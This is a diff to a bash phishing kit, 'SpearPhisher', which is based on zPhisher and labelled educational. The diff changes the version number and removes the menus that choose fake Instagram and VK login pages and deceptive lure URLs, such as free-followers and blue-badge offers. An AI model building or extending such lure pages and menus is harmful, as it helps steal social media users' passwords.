@@ -3,7 +3,7 @@
 ##
 ##   SpearPhisher	: 	Educational Phishing Tool
 ##   Author 		: 	Punkin Tech 
-##   Version 		: 	0.1
+##   Version 		: 	1.0
 ##   Github 		: 	https://github.com/punkintech
 
 ##	 SpearPhisher is based on zPhisher 2.1
@@ -108,70 +108,6 @@ source includes/banner.inc
 source includes/about.inc
 source .menu/menu.inc
 source .menu/tunnel_menu.inc
-
-## Instagram
-site_instagram() {
-	cat <<- EOF
-
-		${BLUE} Select Instagram page style
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="instagram"
-		mask='http://get-unlimited-followers-for-instagram'
-		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="ig_followers"
-		mask='http://get-unlimited-followers-for-instagram'
-		tunnel_menu
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="insta_followers"
-		mask='http://get-1000-followers-for-instagram'
-		tunnel_menu
-	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
-		website="ig_verify"
-		mask='http://blue-badge-verify-for-instagram-free'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_instagram; }
-	fi
-}
-
-## Vk
-site_vk() {
-	cat <<- EOF
-
-		${BLUE} Select Vk page style
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="vk"
-		mask='http://vk-premium-real-method-2020'
-		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="vk_poll"
-		mask='http://vote-for-the-best-social-media'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_vk; }
-	fi
-}
 
 ## Main
 kill_pid
